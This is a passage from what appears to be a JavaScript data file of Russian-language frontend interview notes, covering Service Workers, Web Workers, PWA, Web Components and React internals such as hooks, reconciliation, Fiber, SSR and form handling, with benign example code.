• Нет доступа к DOM

**Регистрация:**
\`\`\`js
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw.js')
    .then(reg => console.log('SW зарегистрирован', reg))
    .catch(err => console.log('Ошибка', err));
}
\`\`\`

**Полный жизненный цикл:**
\`\`\`
installing → выполняется install (кэширование ассетов)
waiting    → установка прошла, ждёт пока закроются вкладки со старым SW
activating → выполняется activate (чистка старых кэшей)
activated  → контролирует страницы, слушает fetch/push
redundant  → заменён новой версией или сломался при установке
\`\`\`

**Почему появляется waiting:** браузер нашёл новый sw.js → запустил install у v2 → v2 завис в waiting, потому что старый v1 ещё контролирует открытые вкладки. F5 не помогает — перезагрузка не закрывает документ. Нужно закрыть все вкладки сайта или вызвать \`skipWaiting()\`.

**Install** — загружают статику в кэш для офлайн. Если хоть один файл не загрузился — install падает, SW не активируется.

**Activate** — удаляют кэши предыдущих версий (старый SW писал в \`'v1'\`, новый в \`'v2'\` — \`'v1'\` больше не нужен).

**skipWaiting()** — пропустить фазу waiting, активироваться немедленно, выкинув старый SW.
**clients.claim()** — забрать контроль над уже открытыми вкладками (без него они остаются у старого SW до следующей навигации даже после активации нового).
**Связка skipWaiting() + clients.claim()** — мгновенное обновление без перезагрузки. Но риск: страница загруженная со старым SW внезапно начинает общаться с новым — если форматы кэша/API несовместимы, поломается. Поэтому многие команды вместо этой связки показывают баннер "обновите страницу".
\`\`\`js
self.addEventListener('install', (event) => {
  event.waitUntil(
    caches.open('v1').then(cache => cache.addAll(['/index.html', '/app.js']))
  );
  self.skipWaiting(); // активировать немедленно, не ждать закрытия вкладок
});

self.addEventListener('activate', (event) => {
  event.waitUntil(
    caches.keys().then(keys =>
      Promise.all(keys.filter(k => k !== 'v1').map(k => caches.delete(k)))
    )
  );
  self.clients.claim(); // взять контроль над всеми открытыми вкладками
});
\`\`\`

**Стратегии кэширования:**

**Cache First** — сначала кэш, потом сеть (для статики):
\`\`\`js
self.addEventListener('fetch', (event) => {
  event.respondWith(
    caches.match(event.request).then(cached => cached || fetch(event.request))
  );
});
\`\`\`

**Network First** — сначала сеть, при ошибке кэш (для API):
\`\`\`js
self.addEventListener('fetch', (event) => {
  event.respondWith(
    fetch(event.request).catch(() => caches.match(event.request))
  );
});
\`\`\`

**Stale While Revalidate** — отдаём кэш сразу, обновляем в фоне:
\`\`\`js
self.addEventListener('fetch', (event) => {
  event.respondWith(
    caches.open('v1').then(cache =>
      cache.match(event.request).then(cached => {
        const fetchPromise = fetch(event.request).then(response => {
          cache.put(event.request, response.clone());
          return response;
        });
        return cached || fetchPromise;
      })
    )
  );
});
\`\`\`

**Push уведомления:**
\`\`\`js
Notification.requestPermission().then(permission => { /* подписываемся */ });

self.addEventListener('push', (event) => {
  const data = event.data.json();
  event.waitUntil(
    self.registration.showNotification(data.title, { body: data.body, icon: '/icon.png' })
  );
});
\`\`\`

**Background Sync** — откладывает запросы до появления сети:
\`\`\`js
navigator.serviceWorker.ready.then(sw => sw.sync.register('send-message'));

self.addEventListener('sync', (event) => {
  if (event.tag === 'send-message') event.waitUntil(sendPendingMessages());
});
\`\`\`

**Возможности:** кэширование, офлайн-режим, push-уведомления, background sync, перехват и модификация любых запросов.`},{name:"Web-workers",level:"4",content:`**Web Worker** — запускает JS в отдельном потоке, не блокируя main thread и UI. Нет доступа к DOM, window, document — только вычисления и сеть (fetch).

**Когда использовать:** тяжёлые вычисления (парсинг, шифрование, обработка изображений, сортировка больших массивов) — всё что вешает интерфейс дольше ~16ms.

**Создание и общение через postMessage:**
\`\`\`js
// main.js
const worker = new Worker('./worker.js');

worker.postMessage({ type: 'compute', data: bigArray }); // отправить

worker.onmessage = (e) => console.log('результат:', e.data);
worker.onerror = (e) => console.error(e.message);

worker.terminate(); // убить воркер
\`\`\`
\`\`\`js
// worker.js
self.onmessage = (e) => {
  const result = heavyComputation(e.data.data);
  self.postMessage(result); // отправить обратно
};
\`\`\`
Данные передаются копированием (structured clone) — изменения в воркере не влияют на оригинал.

**Transferable Objects** — передача без копирования, данные перемещаются (ArrayBuffer становится недоступен в отправителе):
\`\`\`js
const buffer = new ArrayBuffer(1024 * 1024 * 32); // 32MB
worker.postMessage(buffer, [buffer]); // второй аргумент — список transferable
// buffer здесь теперь пустой (detached)
\`\`\`
Критично для больших бинарных данных — без transfer копирование 32MB блокирует поток.

**SharedWorker** — один экземпляр воркера на все вкладки одного домена. Общение через port:
\`\`\`js
// main.js
const worker = new SharedWorker('./shared.js');
worker.port.start();
worker.port.postMessage('hello');
worker.port.onmessage = (e) => console.log(e.data);
\`\`\`
\`\`\`js
// shared.js
self.onconnect = (e) => {
  const port = e.ports[0];
  port.onmessage = (e) => port.postMessage('ответ: ' + e.data);
};
\`\`\`
Применение: общий кэш данных, синхронизация состояния между вкладками.

**Inline Worker** — без отдельного файла:
\`\`\`js
const blob = new Blob([
  \`self.onmessage = (e) => self.postMessage(e.data * 2);\`
], { type: 'application/javascript' });
const worker = new Worker(URL.createObjectURL(blob));
\`\`\`

**Worker vs Service Worker:**
\`\`\`
Web Worker      — вычисления в фоне, живёт пока страница открыта
Service Worker  — прокси для сети, живёт независимо от страницы
\`\`\``},{name:"Как веб-приложение превратить в PWA",level:"4",content:`**PWA (Progressive Web App)** — веб-приложение которое ведёт себя как нативное: устанавливается на устройство, работает офлайн, получает push-уведомления.

**3 обязательных компонента:**
1. **HTTPS** — обязательно для SW и установки
2. **Web App Manifest** — описывает приложение
3. **Service Worker** — кэширование и офлайн

**Web App Manifest:**
\`\`\`json
{
  "name": "My Application",
  "short_name": "MyApp",
  "start_url": "/",
  "scope": "/",
  "display": "standalone",
  "background_color": "#ffffff",
  "theme_color": "#000000",
  "icons": [
    { "src": "/icon-192.png", "sizes": "192x192", "type": "image/png" },
    { "src": "/icon-512.png", "sizes": "512x512", "type": "image/png" },
    { "src": "/icon-512.png", "sizes": "512x512", "type": "image/png", "purpose": "maskable" }
  ]
}
\`\`\`
\`\`\`html
<link rel="manifest" href="/manifest.json">
<meta name="theme-color" content="#000000">
\`\`\`

**display варианты:**
\`\`\`
standalone  — как нативное приложение, без браузерного UI (самый популярный)
fullscreen  — полный экран без каких-либо элементов браузера
minimal-ui  — минимальный браузерный UI (кнопки назад/вперёд)
browser     — обычная вкладка браузера
\`\`\`

**Установка — кастомный баннер:**
\`\`\`js
let deferredPrompt;

window.addEventListener('beforeinstallprompt', (e) => {
  e.preventDefault();
  deferredPrompt = e;
  showInstallButton();
});

installButton.addEventListener('click', () => {
  deferredPrompt.prompt();
  deferredPrompt.userChoice.then(choice => {
    if (choice.outcome === 'accepted') console.log('Установлено!');
    deferredPrompt = null;
  });
});
\`\`\`
Браузер показывает баннер автоматически если: HTTPS + manifest с иконками + SW зарегистрирован + пользователь провёл достаточно времени на сайте.

**Push уведомления:**
\`\`\`js
// 1. Запросить разрешение:
const permission = await Notification.requestPermission();

// 2. Подписаться (VAPID ключ генерируется на сервере):
const subscription = await registration.pushManager.subscribe({
  userVisibleOnly: true,
  applicationServerKey: vapidPublicKey
});
// 3. Отправить subscription на сервер — он будет слать уведомления

// 4. В SW получаем push:
self.addEventListener('push', (event) => {
  const data = event.data.json();
  event.waitUntil(
    self.registration.showNotification(data.title, {
      body: data.body,
      icon: '/icon.png',
      data: { url: data.url }
    })
  );
});

// 5. Клик по уведомлению:
self.addEventListener('notificationclick', (event) => {
  event.notification.close();
  event.waitUntil(clients.openWindow(event.notification.data.url));
});
\`\`\`

**Проверка:** DevTools → Application (Manifest, Service Workers, Cache Storage). Lighthouse — аудит PWA.

**Преимущества:** без App Store, автообновление, офлайн, push, индексируется поисковиками.

**Ограничения:** iOS — push только с iOS 16.4+; нет доступа к некоторым нативным API (Bluetooth, NFC).`},{name:"WebComponents, ShadowDOM, Custom Elements",level:"4",content:`**Web Components** — набор браузерных API для создания переиспользуемых кастомных HTML элементов с инкапсулированной логикой и стилями. Без фреймворков — нативный браузер.

Три составляющих: **Custom Elements**, **Shadow DOM**, **HTML Templates**.

**Custom Elements — создание своих тегов:**
\`\`\`js
class MyButton extends HTMLElement {
  constructor() {
    super();
    // инициализация — не трогать DOM здесь!
  }

  connectedCallback() {
    // элемент добавлен в DOM — здесь работаем с DOM
    this.render();
  }

  disconnectedCallback() {
    // элемент удалён из DOM — чистим listeners, таймеры
  }

  attributeChangedCallback(name, oldValue, newValue) {
    this.render(); // атрибут изменился
  }

  static get observedAttributes() {
    return ['color', 'disabled']; // какие атрибуты отслеживать
  }

  render() {
    this.textContent = this.getAttribute('label') || 'Click';
  }
}

// имя обязательно содержит дефис!
customElements.define('my-button', MyButton);
\`\`\`
\`\`\`html
<my-button color="red" label="Submit"></my-button>
\`\`\`

**Shadow DOM — изолированное DOM-дерево.** Стили снаружи не проникают внутрь и наоборот:
\`\`\`js
class MyCard extends HTMLElement {
  connectedCallback() {
    const shadow = this.attachShadow({ mode: 'open' });
    shadow.innerHTML = \`
      <style>
        .card { border: 1px solid #ccc; padding: 16px; }
        h2 { color: navy; } /* не утечёт наружу */
      </style>
      <div class="card">
        <h2><slot name="title">Default Title</slot></h2>
        <p><slot>Default content</slot></p>
      </div>
    \`;
  }
}
customElements.define('my-card', MyCard);
\`\`\`
\`\`\`html
<my-card>
  <span slot="title">My Title</span>
  <p>Card content</p>
</my-card>
\`\`\`

**mode: open vs closed:**
\`\`\`js
this.attachShadow({ mode: 'open' });   // element.shadowRoot — доступен
this.attachShadow({ mode: 'closed' }); // element.shadowRoot — null
\`\`\`

**Slots — проекция внешнего контента внутрь Shadow DOM:**
Именованный slot — \`slot="name"\` для конкретного места.
Дефолтный slot — без имени, принимает всё остальное.

**HTML Templates — шаблоны которые парсятся, но не рендерятся сразу:**
\`\`\`html
<template id="card-template">
  <div class="card">
    <h2 class="title"></h2>
  </div>
</template>
\`\`\`
\`\`\`js
const clone = document.getElementById('card-template').content.cloneNode(true);
clone.querySelector('.title').textContent = this.getAttribute('title');
this.attachShadow({ mode: 'open' }).appendChild(clone);
\`\`\`

**Изоляция Shadow DOM — не абсолютная.** Три способа "пробить" границу:

1. **Наследуемые CSS-свойства** (\`color\`, \`font-family\`, \`line-height\` и др.) — проходят сквозь границу от shadow host. \`body { color: blue }\` → текст внутри тоже синий.
2. **CSS-переменные** — намеренно проходят сквозь границу. Стандартный API кастомизации компонентов:
\`\`\`css
/* снаружи: */
my-button { --btn-color: red; }
/* внутри Shadow DOM: */
button { color: var(--btn-color, blue); }
\`\`\`
3. **\`::part()\`** — компонент помечает элементы атрибутом \`part\`, снаружи стилизуют через псевдоэлемент:
\`\`\`css
/* внутри: <button part="btn"> */
my-button::part(btn) { background: red; }
\`\`\`

**Жизненный цикл:** constructor → connectedCallback → attributeChangedCallback → disconnectedCallback

**Web Components vs React:**
\`\`\`
                  Web Components     React
Фреймворк         не нужен           нужен React
Изоляция стилей   Shadow DOM         CSS Modules / styled
Реактивность      вручную            автоматически
Переиспользование любой фреймворк    только React
\`\`\`

**Когда использовать:** дизайн-системы для разных фреймворков, виджеты для встраивания на сторонние сайты.
**Примеры:** GitHub UI, Google Material Web, YouTube.`}]},{id:"react",title:"REACT",icon:"⚛️",color:"#61DAFB",topics:[{name:"Компоненты, свойства: Props, State, однонаправленный поток данных",level:"2",content:`**Однонаправленный поток:** данные (props) текут сверху вниз. Обратно — через колбэки.

**Props** — неизменяемы (read-only), передаются от родителя.
**State** — принадлежит компоненту, изменяется через setter, вызывает ререндер.

**Ререндер дочерних:** по умолчанию ВСЕ дети ререндерятся при ререндере родителя. React.memo — предотвращает, если props не изменились.

**Ловушка с memo + колбэками:** новая функция каждый ререндер → новая ссылка → memo бесполезен. Решение: useCallback.`,score:4.5},{name:"Особенности синтаксиса JSX",level:"2",content:"**JSX → React.createElement(type, props, children) → объект (React-элемент)**\n\n`className` вместо `class` (зарезервированное слово), `htmlFor` вместо `for`.\n\nВ React 17+ — `_jsx()` вместо createElement, не нужен `import React`.",score:4},{name:"Хуки: встроенные и пользовательские",level:"2",content:`**useState** — состояние компонента
**useEffect** — побочные эффекты (API, подписки)
**useMemo** — мемоизация результата вычисления
**useCallback** — мемоизация функции (= useMemo(() => fn, deps))
**useRef** — ссылка на DOM / хранение данных без ререндера
**useContext** — потребление контекста
**useReducer** — сложное состояние (как мини-Redux)
**useTransition** — помечает обновление как низкоприоритетное (UI не зависает при тяжёлых ререндерах)
**useLayoutEffect** — как useEffect, но синхронно после мутации DOM до отрисовки. Для измерения DOM и предотвращения визуального мерцания. Стоит дороже useEffect.
**useId** — стабильный уникальный ID для пары label/input. Решает проблему гидратации при SSR:
\`\`\`js
const id = useId();
return <><label htmlFor={id}>Name</label><input id={id} /></>;
\`\`\`
**useImperativeHandle(ref, () => api, deps)** — выставить наружу только нужные методы:
\`\`\`js
const Input = forwardRef((props, ref) => {
  const inputRef = useRef();
  useImperativeHandle(ref, () => ({
    focus: () => inputRef.current.focus(),
    clear: () => { inputRef.current.value = ''; }
  }));
  return <input ref={inputRef} />;
});
// Родитель: ref.current.focus() — только выставленное API
\`\`\`
**useSyncExternalStore(subscribe, getSnapshot)** — подписка на внешние сторы с поддержкой Concurrent Mode. Именно так работают Zustand, Redux Toolkit, Jotai.

**Правила хуков:**
1. Только на верхнем уровне (не в if/for/вложенных функциях)
2. Префикс \`use\`
React запоминает хуки по **порядку вызова**.`,score:4},{name:"Жизненный цикл компонента",level:"2",content:`**3 фазы:** Mounting → Updating → Unmounting

**useEffect маппинг:**
\`\`\`js
useEffect(() => { ... }, []);     // componentDidMount
useEffect(() => { ... }, [dep]);  // componentDidUpdate (для dep)
useEffect(() => {
  return () => { ... };           // componentWillUnmount
}, []);
\`\`\`

**shouldComponentUpdate** → React.memo (для функциональных).`,score:4},{name:"Фрагменты",level:"2",content:"Группировка без лишнего DOM-узла: `<Fragment>` или `<>...</>`.\n\n`<>` — нельзя передать key. `<Fragment key={id}>` — можно. Единственный случай для полного Fragment — списки.",score:5},{name:"Компоненты высшего порядка",level:"3",content:`**HOC** — функция, принимающая компонент → возвращающая новый с расширенной функциональностью.

\`\`\`jsx
function withAuth(Component) {
  return function(props) {
    if (!useAuth()) return <Redirect to="/login" />;
    return <Component {...props} />;
  };
}
const ProtectedPage = withAuth(Dashboard);
\`\`\`

HOC не изменяет оригинальный компонент, а оборачивает. Сейчас заменён хуками.`,score:4},{name:"Virtual DOM",level:"3",content:`**Зачем нужен Virtual DOM**

Прямые операции с реальным DOM дорогие — каждое изменение может вызвать reflow и repaint. Если при каждом обновлении состояния перерисовывать весь UI через innerHTML, это будет крайне медленно.

Virtual DOM — это легковесный JS-объект, который описывает как должен выглядеть DOM:
\`\`\`js
// JSX <div className="box"><p>Hello</p></div>
// компилируется в:
{
  type: 'div',
  props: { className: 'box' },
  children: [{ type: 'p', props: {}, children: ['Hello'] }]
}
\`\`\`

При изменении состояния React строит новое дерево VDOM и сравнивает его со старым — это называется **diffing**. В реальный DOM попадают только минимальные изменения.

**Reconciliation — алгоритм сравнения деревьев**

Наивный diff двух деревьев — O(n³). React использует эвристики и делает это за O(n):

**1. Разный тип элемента → снести поддерево и построить заново:**
\`\`\`jsx
// было:
<div><Counter /></div>
// стало:
<span><Counter /></span>
\`\`\`
React видит div → span: старый DOM-узел удаляется. Все дочерние компоненты (Counter) вызывают componentWillUnmount / cleanup useEffect. Их state уничтожается. Новое поддерево монтируется с нуля — componentDidMount / useEffect запускаются заново.

**2. Одинаковый тип DOM-элемента → обновить только изменившееся:**
\`\`\`jsx
// было: <div className="old" title="x" />
// стало: <div className="new" />
\`\`\`
DOM-узел тот же — React только патчит атрибуты (className меняет, title удаляет). Дочерние компоненты продолжают жить, их state сохраняется — рекурсивно применяется тот же алгоритм.

**2б. Одинаковый тип компонента → обновить props, перерендерить:**
\`\`\`jsx
// было: <Counter step={1} />
// стало: <Counter step={2} />
\`\`\`
Экземпляр компонента тот же — React обновляет props и вызывает рендер. State сохраняется. Запускается useEffect у которого изменились deps.

**3. Списки → React не знает что с чем сопоставить без key:**
\`\`\`jsx
// Без key при добавлении в начало React перерисует все элементы
// С key React знает: этот элемент переместился, а не пересоздался
[<li key="a">A</li>, <li key="b">B</li>]
\`\`\`
С правильным key: компонент переместился → React переиспользует экземпляр, state сохраняется. Без key или с изменившимся key: компонент считается новым → полный unmount + mount, state теряется.

**Почему index как key — антипаттерн:**
\`\`\`jsx
// Список: [A(0), B(1), C(2)]
// Вставили в начало D: [D(0), A(1), B(2), C(3)]
// React видит: key=0 изменился (был A, стал D) → обновляет
// Все элементы "изменились" → лишние ререндеры + баги со state инпутов
\`\`\`
Key должен быть стабильным уникальным идентификатором из данных (id из БД, slug и т.д.).

**VDOM — не бесплатный:**
Создание и сравнение VDOM тоже стоит памяти и CPU. Для очень простых случаев (статичные страницы, частые мелкие обновления) прямые DOM-операции могут быть быстрее. Svelte и Solid.js отказались от VDOM в пользу компиляции в точечные DOM-обновления.`,score:4},{name:"Способы оптимизации React-приложения",level:"3",content:`1. **memo/useMemo/useCallback** — мемоизация (применять предметно!)
2. **React.lazy + Suspense** — code splitting
3. **Виртуализация списков** — react-window, react-virtualized
4. **Колокализация стейта** — стейт ближе к месту использования
5. **Стейт-менеджеры** — точечная подписка на данные`,score:3.5},{name:"Предохранители (ErrorBoundary)",level:"3",content:`Классовый компонент, ловит ошибки в рендере и жизненном цикле дочерних.

**НЕ ловит:**
• Обработчики событий (onClick и т.д.)
• Асинхронный код (setTimeout, fetch)
• SSR
• Ошибки в самом ErrorBoundary

Можно размещать на разных уровнях дерева — если секция упадёт, остальное работает.

**Два специальных метода:**

**\`static getDerivedStateFromError(error)\`** — вызывается в фазе рендера при ошибке в дочернем дереве. Возвращает объект, который мержится в state. Используется чтобы показать fallback UI.

**\`componentDidCatch(error, info)\`** — вызывается в фазе commit, уже после рендера fallback. \`info.componentStack\` — стек компонентов. Используется для логирования (Sentry, Datadog и т.д.).

\`\`\`jsx
class ErrorBoundary extends React.Component {
  state = { hasError: false };

  static getDerivedStateFromError(error) {
    // Фаза рендера — side effects запрещены
    return { hasError: true };
  }

  componentDidCatch(error, info) {
    // Фаза commit — можно логировать
    Sentry.captureException(error, { extra: info.componentStack });
  }

  render() {
    if (this.state.hasError) return <h2>Что-то пошло не так</h2>;
    return this.props.children;
  }
}
\`\`\`

**Порядок вызовов при ошибке:**
1. Дочерний компонент бросает ошибку во время рендера
2. \`getDerivedStateFromError\` → state обновляется → ErrorBoundary перерендеривается с fallback
3. \`componentDidCatch\` → логирование

**React 19: \`use(promise)\` + Suspense** частично заменяет ErrorBoundary для async ошибок, но для ошибок рендера классовый ErrorBoundary по-прежнему единственный способ.`,score:3},{name:"Порталы и как ими пользоваться",level:"3",content:"```jsx\nimport { createPortal } from 'react-dom';\ncreatePortal(<Modal />, document.getElementById('modal-root'));\n```\n\nМонтирует в другой DOM-узел, но события всплывают по **React-дереву** (не DOM-дереву).",score:4},{name:"React Context",level:"3",content:`Решает **prop drilling**. createContext → Provider (value) → useContext.

**Проблема:** изменение value → ВСЕ подписчики ререндерятся. React.memo НЕ помогает (контекст обходит memo).

**Решение:** разделить на отдельные контексты (UserContext, ThemeContext).`,score:4.5},{name:"Концепция SSR. Ограничения применения",level:"3",content:`**CSR vs SSR**

CSR (Client-Side Rendering) — браузер получает пустой HTML и JS-бандл, React строит DOM на клиенте. Пользователь видит белый экран пока JS не загрузится и не выполнится.

SSR (Server-Side Rendering) — сервер запускает React, генерирует готовый HTML и отдаёт его. Браузер показывает контент сразу — ещё до загрузки JS.

**Как работает SSR + гидратация:**
\`\`\`
1. Запрос → сервер рендерит компоненты в HTML-строку
2. Браузер получает готовый HTML → показывает контент (FCP быстрый)
3. JS-бандл загружается
4. hydrateRoot() — React "оживляет" существующий DOM:
   привязывает обработчики событий, восстанавливает state
5. Страница становится интерактивной (TTI)
\`\`\`
Между шагами 2 и 5 — страница выглядит готовой, но не интерактивна. Это называется **hydration gap**.

**React API:**
\`\`\`js
// Клиент CSR:
creatRoot(document.getElementById('root')).render(<App />);

// Клиент SSR — гидратация существующего DOM:
hydrateRoot(document.getElementById('root'), <App />);

// Сервер (старый, синхронный — блокирует поток):
const html = renderToString(<App />);

// Сервер (React 18, стриминг — отдаёт HTML по частям):
const { pipe } = renderToPipeableStream(<App />, {
  onShellReady() { pipe(response); }
});
\`\`\`

**Streaming SSR** — сервер начинает отдавать HTML не дожидаясь рендера всей страницы. Работает вместе с \`<Suspense>\`: тяжёлые части стримятся позже, оболочка приходит сразу.

**Плюсы SSR:**
• Быстрый FCP — пользователь видит контент без ожидания JS
• SEO — поисковики получают готовый HTML
• Работает без JS на клиенте

**Ограничения и минусы:**
• Нет \`window\`, \`document\`, \`localStorage\` на сервере — весь браузерный API недоступен
• Увеличенный TTFB — сервер должен отрендерить прежде чем отдать
• Нагрузка на сервер — React выполняется при каждом запросе
• Гидратация должна дать идентичный DOM — расхождение сервер/клиент вызывает ошибки и полный перерендер
• Сложнее деплой — нужен Node.js сервер, не просто CDN

**Hydration mismatch — главная ловушка SSR**

\`window\`, \`document\`, \`localStorage\` недоступны на сервере — это классическая причина расхождения:
\`\`\`jsx
// Проблема — на сервере window нет
function Component() {
  return <div>{window.innerWidth > 768 ? 'Desktop' : 'Mobile'}</div>
}
// Сервер: крашится или рендерит одно
// Клиент: рендерит другое → mismatch
\`\`\`

**Что происходит при mismatch:** React выбрасывает предупреждение и перерендеривает весь поддерев заново на клиенте — теряется всё преимущество SSR для этого участка.

**Другие частые причины mismatch:**
• Дата/время — сервер рендерит в UTC, клиент в локальном часовом поясе
• \`Math.random()\` — разные значения на сервере и клиенте
• \`localStorage\` / \`cookies\` — недоступны на сервере
• ID генерируемые на лету — используй \`useId()\` из React

**Как фиксить:**
\`\`\`jsx
// 1. Перенести браузерный код в useEffect (выполняется только на клиенте)
function Component() {
  const [width, setWidth] = useState(0);
  useEffect(() => { setWidth(window.innerWidth); }, []);
  return <div>{width > 768 ? 'Desktop' : 'Mobile'}</div>;
}

// 2. Явный suppressHydrationWarning для динамических значений
<time suppressHydrationWarning>{new Date().toLocaleString()}</time>

// 3. Рендерить компонент только на клиенте
const [mounted, setMounted] = useState(false);
useEffect(() => setMounted(true), []);
if (!mounted) return null;
\`\`\`

**Когда SSR оправдан:** публичные страницы с важным SEO, медленные устройства/соединения, контент-сайты. Для дашбордов за авторизацией — CSR проще и достаточно.`,score:3.5},{name:"Form managers",level:"3",content:`**Контролируемые компоненты:** значение в state, React управляет вводом. Каждый keystroke → setState → ререндер.
\`\`\`jsx
const [value, setValue] = useState('');
<input value={value} onChange={e => setValue(e.target.value)} />
\`\`\`
**Неконтролируемые компоненты:** DOM хранит значение, React читает через ref когда нужно.
\`\`\`jsx
const ref = useRef();
<input ref={ref} defaultValue="initial" />
// При сабмите: ref.current.value
\`\`\`

**React Hook Form** — работает через неконтролируемые компоненты + \`register\` (ref под капотом). React не знает о значениях полей до сабмита — ререндер только при ошибках валидации и сабмите. Производительный выбор для больших форм.

**Formik** — контролируемые компоненты, значение каждого поля в state. Каждый keystroke → setState → ререндер всей формы. При 20+ полях начинает тормозить. Зато проще для понимания и работы с зависимыми полями.

**Главное отличие:** RHF читает значения из DOM через refs в момент сабмита. Formik держит все значения в React state всё время — отсюда разница в производительности.

**Валидация схемами:**
\`\`\`js
const schema = z.object({
  email: z.string().email(),
  age: z.number().min(18)
});
const { register, handleSubmit, formState: { errors } } = useForm({
  resolver: zodResolver(schema)
});
\`\`\`

**React 19 — Server Actions**

Server Action — async-функция с директивой \`'use server'\`, которая выполняется на сервере. Вызывается с клиента как обычная функция, но запрос уходит на сервер автоматически — без fetch, без API-роута.

\`\`\`jsx
// actions.ts (серверный код)
'use server';
export async function saveUser(formData: FormData) {
  await db.users.create({ name: formData.get('name') });
  revalidatePath('/users'); // инвалидировать кэш Next.js
}
\`\`\`

\`\`\`jsx
// Вариант 1 — нативная форма (работает даже без JS на клиенте):
<form action={saveUser}>
  <input name="name" />
  <button>Save</button>
</form>

// Вариант 2 — программный вызов:
<button onClick={() => saveUser(formData)}>Save</button>
\`\`\`

**useActionState** — отслеживает состояние Server Action (pending, error, result):
\`\`\`jsx
const [state, formAction, isPending] = useActionState(saveUser, null);

<form action={formAction}>
  <input name="name" />
  <button disabled={isPending}>
    {isPending ? 'Сохраняем...' : 'Save'}
  </button>
  {state?.error && <p>{state.error}</p>}
</form>
\`\`\`

**Плюсы:** нет boilerplate с fetch/useState/loading, прогрессивное улучшение (форма работает без JS), серверный код не попадает в бандл клиента, типобезопасность end-to-end.

**Ограничения:** только в серверных окружениях (Next.js App Router, Remix и т.д.). В чистом React без фреймворка — не работает.`,score:3},{name:"React паттерны. Compound components. render-props",level:"4",content:`**Compound Components:** набор связанных компонентов через Context.
\`\`\`jsx
<Table>
  <Table.Header><Table.Cell>Name</Table.Cell></Table.Header>
  <Table.Row><Table.Cell>Alice</Table.Cell></Table.Row>
</Table>
\`\`\`

**Render-props:** паттерн для переиспользования логики — компонент управляет данными/поведением, а потребитель сам решает как их рендерить.
\`\`\`jsx
// MouseTracker знает координаты, но не знает как их показать
class MouseTracker extends React.Component {
  state = { x: 0, y: 0 };
  handleMove = (e) => this.setState({ x: e.clientX, y: e.clientY });
  render() {
    return <div onMouseMove={this.handleMove}>{this.props.render(this.state)}</div>;
  }
}

// Потребитель сам решает что рендерить с этими данными:
<MouseTracker render={({ x, y }) => <p>Курсор: {x}, {y}</p>} />
<MouseTracker render={({ x, y }) => <Avatar style={{ left: x, top: y }} />} />
\`\`\`
Задача — разделить логику (что происходит) от представления (как выглядит). До хуков это был основной способ переиспользовать логику с состоянием.

Оба паттерна в основном заменены хуками (проще, без wrapper hell). Render-props → кастомный хук. Но иногда встречаются в библиотеках (react-table, Downshift).`,score:3.5},{name:"Механизм Reconciliation",level:"4",content:`**Что запускает reconciliation:**
setState, dispatch (useReducer), обновление контекста, ререндер родителя. React ставит компонент в очередь на перерендер — не выполняет сразу.

**Batching (пакетирование обновлений):**
React 18 автоматически объединяет несколько setState в один ререндер — даже внутри setTimeout, fetch, промисов:
\`\`\`js
// Один ререндер, не три:
setTimeout(() => {
  setA(1);
  setB(2);
  setC(3);
}, 1000);
\`\`\`
До React 18 batching работал только в обработчиках событий.

**Work-in-progress tree (двойная буферизация):**
React держит два дерева: текущее (current) — то что видит пользователь, и work-in-progress — то что строится. Diffing идёт между ними. Когда всё готово — деревья меняются местами атомарно. Пользователь никогда не видит незавершённое состояние.

**Почему O(n), а не O(n³):**
Наивный diff любых двух деревьев — O(n³). React использует две эвристики которые делают это O(n):
1. Элементы разного типа никогда не сравниваются — сразу снос и пересоздание
2. key — подсказка React какой элемент списка соответствует какому

**Bailout — пропуск поддерева:**
Если React при обходе видит что props и state компонента не изменились — он пропускает всё поддерево целиком, не заходя в него:
\`\`\`js
// React.memo — bailout если props не изменились (поверхностное сравнение)
const Child = React.memo(({ value }) => <div>{value}</div>);

// Нюанс: новая функция каждый ререндер = новая ссылка = memo бесполезен
<Child onClick={() => doSomething()} /> // ❌
<Child onClick={useCallback(() => doSomething(), [])} /> // ✅
\`\`\`

**Важный нюанс — ререндер ≠ обновление DOM:**
Реакт может вызвать render-функцию компонента, посчитать VDOM и решить что реальный DOM менять не нужно — изменений нет. Ререндер дорог памятью (создание VDOM), но не обязательно дорог DOM-операциями.`,score:4},{name:"Архитектура Fiber",level:"4",content:`**Проблема до Fiber (React 15 и раньше):**
Reconciliation был синхронным рекурсивным обходом стека. Начав обход — нельзя остановиться. При большом дереве JS занимал main thread на десятки миллисекунд: анимации замерзали, ввод не отвечал.

**Что такое Fiber:**
Fiber — это новый движок reconciliation (React 16+) и одновременно структура данных. Каждый компонент в дереве — это Fiber-узел:
\`\`\`js
// Упрощённо что хранит Fiber-узел:
{
  type,          // тип компонента или DOM-тег
  props,         // текущие props
  stateNode,     // DOM-узел или экземпляр класса
  memoizedState, // state хуков (связный список)
  child,         // первый дочерний Fiber
  sibling,       // следующий сосед
  return,        // родительский Fiber
  flags,         // что нужно сделать: Update | Placement | Deletion
}
\`\`\`
Вместо рекурсии — связный список. Обход можно остановить после любого узла и продолжить позже.

**Две фазы работы:**

**1. Render фаза — прерываемая:**
React обходит Fiber-дерево, вызывает render-функции, строит work-in-progress дерево, помечает узлы флагами (Update, Placement, Deletion). Эту работу можно прервать — браузер получит управление для обработки ввода или анимации — и возобновить позже.
Поскольку фаза прерываемая, тело компонента может вызваться несколько раз за одно обновление. Именно поэтому рендер должен быть чистой функцией.

**2. Commit фаза — непрерываемая:**
React берёт список изменений (effectList) и атомарно применяет к реальному DOM. Прерывать нельзя — пользователь не должен видеть промежуточное состояние.
Три подфазы commit:
• **Before mutation** — вызываются getSnapshotBeforeUpdate
• **Mutation** — применяются DOM-изменения
• **Layout** — вызывается useLayoutEffect (синхронно после DOM, до отрисовки)

После этого браузер рисует экран, затем асинхронно вызывается useEffect.

**Приоритеты и Concurrent Mode:**
Fiber позволяет назначать приоритет обновлениям. Срочное (ввод пользователя) → выполняется немедленно. Несрочное → можно отложить:
\`\`\`js
// useTransition — помечает обновление как несрочное
const [isPending, startTransition] = useTransition();
startTransition(() => setFilter(value)); // React может прервать при вводе

// useDeferredValue — дерево с этим значением рендерится с низким приоритетом
const deferred = useDeferredValue(heavyValue);
\`\`\`

**StrictMode вызывает рендер дважды** именно из-за Fiber: проверяет что компонент идемпотентен (два вызова дают одинаковый результат). В продакшне — один раз.`,score:4},{name:"Server components",level:"4",content:`**Проблема которую решают RSC:**
При SSR компонент рендерится на сервере в HTML, но его JS-код всё равно попадает в бандл — для гидратации. Тяжёлые зависимости (markdown-парсер, date библиотека) едут клиенту даже если там они не нужны.

